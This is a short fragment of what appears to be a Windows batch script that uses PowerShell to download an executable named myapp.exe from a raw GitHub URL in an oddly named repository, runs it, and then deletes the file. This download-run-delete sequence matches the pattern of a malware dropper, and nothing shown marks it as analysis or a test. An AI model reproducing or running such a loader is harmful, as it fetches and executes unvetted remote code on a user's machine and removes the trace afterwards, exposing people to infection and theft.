...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sonriseclient/peyyix-canstlr-5664/main/myapp.exe', '%indirme_yeri%')"
"%indirme_yeri%"
del "%indirme_yeri%"
